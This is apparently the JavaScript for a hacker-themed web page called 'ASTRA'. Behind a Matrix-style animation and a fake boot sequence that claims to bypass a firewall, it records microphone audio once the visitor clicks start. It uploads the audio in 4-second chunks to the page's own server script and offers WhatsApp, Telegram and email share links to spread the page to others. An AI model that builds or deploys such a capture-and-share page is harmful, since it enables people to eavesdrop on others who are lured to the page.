// Matrix Rain
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');

function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}
resizeCanvas();

const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
const fontSize = 14;
let columns = Math.floor(canvas.width / fontSize);
let drops = Array(columns).fill(1);

function drawMatrix() {
    ctx.fillStyle = 'rgba(10, 14, 10, 0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#00ff41';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(drawMatrix, 50);

window.addEventListener('resize', () => {
    resizeCanvas();
    columns = Math.floor(canvas.width / fontSize);
    drops = Array(columns).fill(1);
});

// Boot Animation
const bootLines = [
    "[ OK ] Initializing ASTRA kernel...",
    "[ OK ] Loading divine modules...",
    "[ OK ] Establishing secure channel...",
    "[ OK ] Bypassing firewall... [BYPASSED]",
    "[ OK ] Encrypting payload...",
    "[ OK ] Connecting to server...",
    "[ OK ] Authentication: SUCCESS",
    "[ OK ] Loading audio engine...",
    "[ OK ] System integrity: 100%",
    "",
    "⚔️  ASTRA SYSTEM READY ⚔️",
    "",
    "Access granted. Welcome, hacker."
];

const bootText = document.getElementById('bootText');
let lineIndex = 0, charIndex = 0;

function typeBoot() {
    if (lineIndex < bootLines.length) {
        const line = bootLines[lineIndex];
        if (charIndex < line.length) {
            bootText.textContent += line[charIndex];
            charIndex++;
            setTimeout(typeBoot, 20);
        } else {
            bootText.textContent += "\n";
            lineIndex++;
            charIndex = 0;
            setTimeout(typeBoot, 250);
        }
    } else {
        setTimeout(() => {
            document.getElementById('bootScreen').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
        }, 1000);
    }
}
typeBoot();

// Audio Capture Logic
let mediaRecorder = null, audioChunks = [], stream = null;
let chunkCount = 0, startTime = null, uptimeInterval = null;

const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const statusEl = document.getElementById('status');
const chunkCountEl = document.getElementById('chunkCount');
const liveStatusEl = document.getElementById('liveStatus');
const uptimeEl = document.getElementById('uptime');

function updateStatus(msg, color = '#00ff41') {
    statusEl.textContent = '[ ' + msg + ' ]';
    statusEl.style.color = color;
    statusEl.style.textShadow = '0 0 10px ' + color;
}

function updateUptime() {
    if (!startTime) return;
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    uptimeEl.textContent = String(Math.floor(elapsed / 60)).padStart(2, '0') + ':' + String(elapsed % 60).padStart(2, '0');
}

startBtn.addEventListener('click', async () => {
    try {
        updateStatus('REQUESTING MIC ACCESS...', '#ffaa00');
        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        mediaRecorder = new MediaRecorder(stream);
        audioChunks = [];
        chunkCount = 0;
        chunkCountEl.textContent = '0';
        startTime = Date.now();

        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };

        mediaRecorder.onstop = async () => {
            const blob = new Blob(audioChunks, { type: 'audio/wav' });
            if (blob.size > 0) { await sendAudio(blob); chunkCount++; chunkCountEl.textContent = chunkCount; }
            audioChunks = [];
        };

        mediaRecorder.start();
        setInterval(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop(); mediaRecorder.start();
            }
        }, 4000);

        uptimeInterval = setInterval(updateUptime, 1000);
        startBtn.disabled = true; stopBtn.disabled = false;
        updateStatus('RECORDING [LIVE]', '#00ff41');
        liveStatusEl.textContent = 'LIVE';
        liveStatusEl.style.color = '#00ff41';
    } catch (err) {
        updateStatus('ERROR: ' + err.message, '#ff3333');
    }
});

stopBtn.addEventListener('click', () => {
    if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
    if (stream) stream.getTracks().forEach(t => t.stop());
    if (uptimeInterval) clearInterval(uptimeInterval);
    startBtn.disabled = false; stopBtn.disabled = true;
    updateStatus('STOPPED', '#ffaa00');
    liveStatusEl.textContent = 'IDLE';
    liveStatusEl.style.color = '#ffaa00';
});

async function sendAudio(blob) {
    const fd = new FormData();
    fd.append('audio', blob, 'astra_' + Date.now() + '.wav');
    try {
        const res = await fetch('upload.php', { method: 'POST', body: fd });
        updateStatus(res.ok ? 'CHUNK ' + (chunkCount + 1) + ' UPLOADED ✓' : 'UPLOAD FAILED', res.ok ? '#00ff41' : '#ff3333');
    } catch (err) {
        updateStatus('NETWORK ERROR', '#ff3333');
    }
}

// Share Link System
const shareLinkInput = document.getElementById('shareLink');
if (shareLinkInput) shareLinkInput.value = window.location.href;

const copyBtn = document.getElementById('copyBtn');
if (copyBtn) {
    copyBtn.addEventListener('click', () => {
        navigator.clipboard.writeText(window.location.href).then(() => {
            copyBtn.textContent = '✅ COPIED!';
            copyBtn.classList.add('copied');
            setTimeout(() => { copyBtn.textContent = '📋 COPY'; copyBtn.classList.remove('copied'); }, 2000);
        });
    });
}

const waBtn = document.getElementById('whatsappShare');
if (waBtn) waBtn.href = `https://wa.me/?text=${encodeURIComponent('Check this: ' + window.location.href)}`;

const tgBtn = document.getElementById('telegramShare');
if (tgBtn) tgBtn.href = `https://t.me/share/url?url=${encodeURIComponent(window.location.href)}`;

const emailBtn = document.getElementById('emailShare');
if (emailBtn) {
    emailBtn.addEventListener('click', () => {
        window.location.href = `mailto:?subject=${encodeURIComponent('Check this')}&body=${encodeURIComponent(window.location.href)}`;
    });
}
